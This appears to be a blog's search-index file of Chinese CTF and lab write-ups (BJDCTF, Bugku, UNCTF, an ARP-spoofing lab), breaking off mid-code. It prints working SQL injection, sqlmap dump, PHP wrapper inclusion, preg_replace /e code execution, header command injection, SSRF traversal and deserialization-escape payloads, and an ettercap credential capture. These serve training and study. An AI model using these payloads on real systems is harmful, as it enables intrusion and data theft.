<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BJDCTF2020</title>
    <url>/2020/09/28/BJDCTF2020/</url>
    <content><![CDATA[<h1 id="BJDCTF-web"><a href="#BJDCTF-web" class="headerlink" title="BJDCTF-web"></a>BJDCTF-web</h1><a id="more"></a>

<h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy md5"></a>easy md5</h2><p>F12看到了提示，给出了sql语句</p>
<p><img src="/2020/09/28/BJDCTF2020/md5-1.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs pgsql">Hint: <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'admin'</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span>=md5($pass,<span class="hljs-keyword">true</span>)</code></pre></div>

<p>这里是将输入的密码进行了一次md5的加密</p>
<p><strong>md5()函数介绍</strong></p>
<p><img src="/2020/09/28/BJDCTF2020/md5.png" srcset="/img/loading.gif" alt></p>
<p>这里的参数raw=true ，所以是将我们输入的密码加密16字符二进制格式，如果想完成注入，则md5值经过hex转成字符串后为 ‘or’…….这样的字符串，只要出现了or，且or后面的值为真即可完成注入。</p>
<p><code>select * from &#39;admin&#39; where password=&#39; or &#39;sdaa</code></p>
<p>这里经常使用的字符串是<strong>ffifdyop</strong>，该字符串md5加密后若raw参数为True时会返回 <strong>‘or’6&lt;trash&gt;</strong> (&lt;trash&gt;其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的&lt;trash&gt;会在MySQL将其转换成整型比较时丢掉)</p>
<p>查询语句为</p>
<p><code>select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;</code>此查询语句结果为真</p>
<p>提交 ffifdyop后会跳转到另外的页面，查看源码</p>
<p><img src="/2020/09/28/BJDCTF2020/md5-2.png" srcset="/img/loading.gif" alt></p>
<p>这里直接利用md5()函数不能处理数组的特性，get提交 <code>?a[]=1&amp;b[]=2</code></p>
<p>接下来还有一次跳转，直接post <code>param1[]=1&amp;param2[]=2</code>，拿到flag</p>
<p><img src="/2020/09/28/BJDCTF2020/mdd5-3.png" srcset="/img/loading.gif" alt></p>
<h2 id="不过如此"><a href="#不过如此" class="headerlink" title="不过如此"></a>不过如此</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

error_reporting(<span class="hljs-number">0</span>);
$text = $_GET[<span class="hljs-string">"text"</span>]; <span class="hljs-comment">//get 获取一个参数text 使用data伪协议</span>
$file = $_GET[<span class="hljs-string">"file"</span>]; <span class="hljs-comment">//file参数，这里可以使用filter伪协议读取php页面源码</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"I have a dream"</span>))&#123;  <span class="hljs-comment">//text 的内容位I have a dream</span>
  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="hljs-string">'r'</span>).<span class="hljs-string">"&lt;/h1&gt;&lt;/br&gt;"</span>;
  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/flag/"</span>,$file))&#123;                              <span class="hljs-comment">//file参数不能包含flag</span>
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Not now!"</span>);
  &#125;

  <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//next.php 提示了下一个页面的名字 </span>

&#125;
<span class="hljs-keyword">else</span>&#123;
  highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>看到了file参数，想到了文件包含的漏洞利用于是构造以下的payload:</p>
<p><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php</code></p>
<p>对到了index.php页面的base64源码，解码后如下</p>
<p>index.php</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$id = $_GET[<span class="hljs-string">'id'</span>];
$_SESSION[<span class="hljs-string">'id'</span>] = $id;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span><span class="hljs-params">($re, $str)</span> </span>&#123;
    <span class="hljs-keyword">return</span> preg_replace(
        <span class="hljs-string">'/('</span> . $re . <span class="hljs-string">')/ei'</span>,
        <span class="hljs-string">'strtolower("\\1")'</span>,
        $str
    );
&#125;


<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $re =&gt; $str) &#123;
    <span class="hljs-keyword">echo</span> complex($re, $str). <span class="hljs-string">"\n"</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span><span class="hljs-params">()</span></span>&#123;
	@<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'cmd'</span>]);
&#125;</code></pre></div>

<p>利用<strong>preg_replace()使用的/e模式可以存在远程执行代码</strong></p>
<p>在next.php在输入</p>
<div class="hljs"><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">"cat /flag"</span>);</code></pre></div>



<p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">php伪协议</a></p>
<p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">preg_replace /e模式漏洞详解</a></p>
<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>进入页面不知道干啥，随便点点，到flag.php时显示了IP地址</p>
<p>查看原码发现提示<code>&lt;!-- Do you know why i know your ip? --&gt;</code></p>
<p>猜测这里是跟XFF有关，于是修改XFF:127.0.0.1，果然页面显示的就是IP是127.0.0.1</p>
<p>这里就想到了XFF注入，是否可以类似于XFF注入，将系统名令注入进去</p>
<p>首先试试<code>system(&quot;ls /&quot;)</code>,但是发现没有被执行，于是家上括号<code>{system(&quot;ls /&quot;)}</code>，这次执行成功</p>
<p> 获取flag:</p>
<div class="hljs"><pre><code class="hljs clojure">&#123;system(<span class="hljs-string">"cat /flag"</span>)&#125;</code></pre></div>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>md5</tag>
        <tag>sql</tag>
        <tag>php伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku</title>
    <url>/2020/08/08/Bugku/</url>
    <content><![CDATA[<h1 id="Bugku刷题"><a href="#Bugku刷题" class="headerlink" title="Bugku刷题"></a>Bugku刷题</h1><a id="more"></a>

<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><div class="hljs"><pre><code class="hljs html">1' and 1=1 #      
  
1' and 1=2 #</code></pre></div>
<p>   不显示内容，可以判断存在注入点</p>
<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4#可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4</code>#可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><div class="hljs"><pre><code>` -1&apos; union select 1,database(),3,4 #`

  database:skctf_flag</code></pre></div><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre></div><p> table:fl4g,sc</p>
<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre></div><p> skctf_flag</p>
<p> 得到flag</p>
<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中</strong></p>
<p><img src="/2020/08/08/Bugku/cjd1.png" srcset="/img/loading.gif" alt></p>
<h3 id="1-获取数据库"><a href="#1-获取数据库" class="headerlink" title="1.获取数据库"></a>1.获取数据库</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre></div><p><img src="/2020/08/08/Bugku/cjd2.png" srcset="/img/loading.gif" alt></p>
<h3 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre></div><p><img src="/2020/08/08/Bugku/cjd3.png" srcset="/img/loading.gif" alt></p>
<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre></div><p><img src="/2020/08/08/Bugku/cjd4.png" srcset="/img/loading.gif" alt></p>
<h3 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre></div><p><img src="/2020/08/08/Bugku/cjd5.png" srcset="/img/loading.gif" alt></p>
<hr>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p> 扫描发现了index.php，通过  index.php.bak下载网页源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * Created by PhpStorm.</span>
<span class="hljs-comment"> * User: Norse</span>
<span class="hljs-comment"> * Date: 2017/8/6</span>
<span class="hljs-comment"> * Time: 20:22</span>
<span class="hljs-comment">*/</span>

<span class="hljs-keyword">include_once</span> <span class="hljs-string">"flag.php"</span>;
ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
$str = strstr($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>], <span class="hljs-string">'?'</span>);
$str = substr($str,<span class="hljs-number">1</span>);
$str = str_replace(<span class="hljs-string">'key'</span>,<span class="hljs-string">''</span>,$str);
parse_str($str);
<span class="hljs-keyword">echo</span> md5($key1);

<span class="hljs-keyword">echo</span> md5($key2);
<span class="hljs-keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;
<span class="hljs-keyword">echo</span> $flag.<span class="hljs-string">"取得flag"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>


<p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
<p> 2.利用==比较漏洞</p>
<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p> 下列的字符串的MD5值都是0e开头的：</p>
<div class="hljs"><pre><code>QNKCDZO

240610708

s878926199a

s155964671a

s214587387a

s214587387a</code></pre></div><hr>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>爆数据库名</p>
<p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
<p>database:<strong>web1002-1</strong></p>
<p>爆表名</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre></div><p>flag1,hint</p>
<p>爆字段名</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre></div><p>flag1,address<br>获取内容</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre></div><p><strong>usOwycTju+FTUUzXosjr</strong></p>
<p>提交发现不对</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre></div><p>获取address中的内容</p>
<p>./Once_More.php<br>下一关地址<br>得到另外一个地址</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre></div><p>给出提示<br>XPATH syntax error: ‘<del>class,flag2</del>‘</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre></div><p>Unknown column ‘flag2’ in ‘where clause’</p>
<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre></div><p>XPATH syntax error: ‘<del>flag{Bugku-sql_6s-2i-4t-bug}</del>‘</p>
<p><strong>！！！注意把flag改为小写字母</strong></p>
<hr>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>靶场：<a href="靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
<h3 id="一、手工注入"><a href="#一、手工注入" class="headerlink" title="一、手工注入"></a>一、手工注入</h3><p>第一步</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre></div><p>加单引号报错</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre></div><p>查看所有的表</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre></div><p>查看表中的列</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre></div><p>0x637466 为十六进制ctf</p>
<p>获取字段内容</p>
<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre></div><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
<h3 id="二、sqlmap注入"><a href="#二、sqlmap注入" class="headerlink" title="二、sqlmap注入"></a>二、sqlmap注入</h3><p>检测是否有注入点</p>
<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>没有成功<br>使用十六进制</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre></div><p>获取数据库名</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
 --dbs //选择十六进制 获取数据库名 单引号使用url编码</code></pre></div><p>获取表名</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre></div><p>获取flag</p>
<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre></div><p><img src="/2020/08/08/Bugku/k1.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI</title>
    <url>/2020/08/16/SSTI/</url>
    <content><![CDATA[<p><img src="/2020/08/16/SSTI/SSTI%E6%A8%A1%E6%9D%BF.png" srcset="/img/loading.gif" alt><br><code>https://www.cnblogs.com/wangtanzhi/p/12238779.html</code></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>STTI</tag>
      </tags>
  </entry>
  <entry>
    <title>arp attack</title>
    <url>/2020/11/27/attack/</url>
    <content><![CDATA[<h1 id="arp攻击"><a href="#arp攻击" class="headerlink" title="arp攻击"></a>arp攻击</h1><p>ARP（Address Resolution Protocol，地址解析协议是一个位于<a href="https://baike.baidu.com/item/TCP%2FIP协议" target="_blank" rel="noopener">TCP/IP协议</a>栈中的网络层，负责将某个<a href="https://baike.baidu.com/item/IP地址" target="_blank" rel="noopener">IP地址</a>解析成对应的<a href="https://baike.baidu.com/item/MAC地址" target="_blank" rel="noopener">MAC地址</a>。</p>
<a id="more"></a>

<p>ARP 病毒攻击是<a href="https://baike.baidu.com/item/局域网/98626" target="_blank" rel="noopener">局域网</a>最常见的一种攻击方式。由于TCP/IP协议存在的一些漏洞给ARP病毒有进行欺骗攻击的机会，ARP利用TCP/IP协议的漏洞进行欺骗攻击，现已严重影响到人们正常<a href="https://baike.baidu.com/item/上网/217407" target="_blank" rel="noopener">上网</a>和<a href="https://baike.baidu.com/item/通信/300982" target="_blank" rel="noopener">通信</a>安全。当局域网内的计算机遭到ARP的攻击时，它就会持续地向局域网内所有的计算机及网络通信设备发送大量的ARP欺骗数据包，如果不及时处理，便会造成网络通道阻塞、网络设备的承载过重、网络的通讯质量不佳等情况。</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>ARP攻击主要是通过伪造IP地址和MAC地址进行欺骗。使以太网数据包的源地址、目标地址和ARP通信数量剧增导致网络中断或中间人攻击。ARP攻击主要存在于局域网中。若其中一台计算机感染ARP病毒。就会试图通过ARP欺骗截获局域网内其他计算机的信息，造成局域网内的计算机通信故障。</p>
<h2 id="实验机器"><a href="#实验机器" class="headerlink" title="实验机器"></a>实验机器</h2><p>2003虚拟机，作为ftp服务器</p>
<p>xp虚拟机作为用户访问ftp服务</p>
<p>kali作为攻击方，获取xp登录时的账号密码</p>
<p>xp:10.1.1.3/24</p>
<p>2003:10.1.1.1/24</p>
<p>kali:10.1.1.2/24</p>
<h2 id="实验拓扑图"><a href="#实验拓扑图" class="headerlink" title="实验拓扑图"></a>实验拓扑图</h2><p><img src="https://i.loli.net/2020/11/27/BCE6m9cM5pzrFhL.png" srcset="/img/loading.gif" alt="1.png"></p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-检查三台主机的通信情况"><a href="#一-检查三台主机的通信情况" class="headerlink" title="一.检查三台主机的通信情况"></a>一.检查三台主机的通信情况</h3><p>三台主机通信正常</p>
<h3 id="二-2003开启ftp服务器"><a href="#二-2003开启ftp服务器" class="headerlink" title="二.2003开启ftp服务器"></a>二.2003开启ftp服务器</h3><p>开启ftp服务，并设置禁止匿名访问</p>
<p>并创建xp访问时需要的使用的账号</p>
<div class="hljs"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>aaa

<span class="hljs-symbol">password:</span><span class="hljs-number">123.</span><span class="hljs-keyword">com</span></code></pre></div>

<p>验证是可以正常访问的</p>
<h3 id="三-kali打开攻击软件"><a href="#三-kali打开攻击软件" class="headerlink" title="三.kali打开攻击软件"></a>三.kali打开攻击软件</h3><p>打开ettercap-&gt;undefined sniffing-&gt;eth0-&gt;Host-&gt;scan host-&gt;add-&gt;arp posioning-&gt;选择第一项</p>
<p>扫描到两台目标主机，开始arp投毒</p>
<p><img src="https://i.loli.net/2020/11/27/Xos23uSIPQxkiqT.png" srcset="/img/loading.gif" alt="arp-2.png"></p>
<p>此时arp攻击已经开始了</p>
<p>可以看到两个不同的IP对应的确实同一mac地址，当自己的电脑出现这种情况时就可以判断是arp攻击了</p>
<h3 id="四-xp访问ftp服务器，kali抓取到账号密码"><a href="#四-xp访问ftp服务器，kali抓取到账号密码" class="headerlink" title="四.xp访问ftp服务器，kali抓取到账号密码"></a>四.xp访问ftp服务器，kali抓取到账号密码</h3><p>开始第四步</p>
<p>xp访问ftp并输入账号密码</p>
<p>kali那边已经抓取到</p>
<p><img src="https://i.loli.net/2020/11/27/CuI1ovGWZz9tEUp.png" srcset="/img/loading.gif" alt="arp-3.png"></p>
<h2 id="实验结束"><a href="#实验结束" class="headerlink" title="实验结束"></a>实验结束</h2><p>arp攻击的另外一种形式是利用ARP欺骗，造成局域网内主机通信的失败，就是无法连接网络。实现方法比较简单就不再赘述。</p>
]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>arp</tag>
      </tags>
  </entry>
  <entry>
    <title>UNCTF</title>
    <url>/2020/11/17/UNCTF/</url>
    <content><![CDATA[<p>比赛和考试时间有点冲突，也没有好好做题，只好结束复现一下。</p>
<a id="more"></a>

<h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">echo</span><span class="hljs-string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;
highlight_file(<span class="hljs-keyword">__FILE__</span>);
$url = $_GET[<span class="hljs-string">'url'</span>];
<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/unctf\.com/'</span>,$url))&#123;
    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;
        $url=file_get_contents($url);
        <span class="hljs-keyword">echo</span>($url);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">'error!!'</span>);
    &#125;
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"error"</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>看下代码发现过滤了大部分协议名，一开始一直以为是使用特殊编码绕过结果行不通</p>
<p>后来才知道考点根本不绕过。</p>
<p>payload：</p>
<div class="hljs"><pre><code class="hljs coffeescript">?file=unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../../flag
<span class="hljs-regexp">//</span>不唯一
?file=():unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag
<span class="hljs-regexp">//</span>()里可以填任意字符除了正则过滤的几个协议</code></pre></div>

<p><strong>原理：</strong>当php遇到一个不认识的protocol时，会抛出一个warning，并将protocol设置为null,在protoco为null或file时，则进行本地操作。默认情况下不传协议或传入了不存在协议，会进行本地文件操作。</p>
<h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><p><strong>考察点是反序列化字符逃逸</strong></p>
<p>先冲简单的PHP反序列化字符逃逸了解什么是反序化逃逸。</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($str)</span></span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'bb'</span>, <span class="hljs-string">'ccc'</span>, $str);
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">'aaaa'</span>;
    <span class="hljs-keyword">public</span> $pass=<span class="hljs-string">'123456'</span>;
&#125;
$AA=<span class="hljs-keyword">new</span> A();
$res=filter(serialize($AA));

$c=unserialize($res);
<span class="hljs-keyword">echo</span> $c-&gt;pass;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>利用反序列化逃逸修改pass的值。</p>
<p>正常的序列化结果</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"A"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"aaaa"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"pass"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"123456"</span>;&#125;</code></pre></div>

<p><code>s:4:&quot;aaaa&quot;</code>s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。</p>
<p>例如</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"A"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"aaaa"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"pass"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"123456"</span>;&#125;</code></pre></div>

<p>将4改为5，那么则认为name的值为 <code>aaaa&quot;</code>,此时因为前面的”无法闭合而导致反序列化失败。</p>
<p><img src="https://i.loli.net/2020/11/18/Ctefk8iKXP34Gmn.png" srcset="/img/loading.gif" alt="error.png"></p>
<p>而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。</p>
<p>例如想将pass变量的序列化字符串如下</p>
<div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"pass"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:"hacker"</span>;&#125;</code></pre></div>

<p>其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志</p>
<p>上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($str)</span></span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'bb'</span>, <span class="hljs-string">'ccc'</span>, $str);
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";&#125;'</span>;
    <span class="hljs-keyword">public</span> $pass=<span class="hljs-string">'123456'</span>;
&#125;
$AA=<span class="hljs-keyword">new</span> A();
var_dump(serialize($AA));
$res=filter(serialize($AA));
var_dump($res);
$c=unserialize($res);
<span class="hljs-keyword">echo</span> $c-&gt;pass;
<span class="hljs-comment">//echo unserialize($AA);</span>
<span class="hljs-comment">//";s:4:"pass";s:6:"hacker";&#125;</span>
<span class="hljs-meta">?&gt;</span>
   <span class="hljs-comment">//结果如下   ||为对齐</span>
<span class="hljs-comment">/*</span>
<span class="hljs-comment">string(136) "O:1:"A":2:&#123;s:4:"name";s:81:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";&#125;";s:4:"pass";s:6:"123456";&#125;"||</span>
<span class="hljs-comment">string(163) "O:1:"A":2:&#123;s:4:"name";s:81:"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";s:4:"pass";s:6:"hacker";&#125;"||;s:4:"pass";s:6:"123456";&#125;"</span>
<span class="hljs-comment">hacker</span>
<span class="hljs-comment">*/</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/18/qgC18vQGcElFy2e.png" srcset="/img/loading.gif" alt="success.png"></p>
<p>这里pass的值就被该称了hacker</p>
<p>总结：<strong>逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。</strong></p>
<p><a href="https://www.cnblogs.com/Sumarua/p/12932401.html" target="_blank" rel="noopener">参考</a></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
highlight_file(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $uname;
    <span class="hljs-keyword">public</span> $password;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($uname,$password)</span></span>
<span class="hljs-function">    </span>&#123;
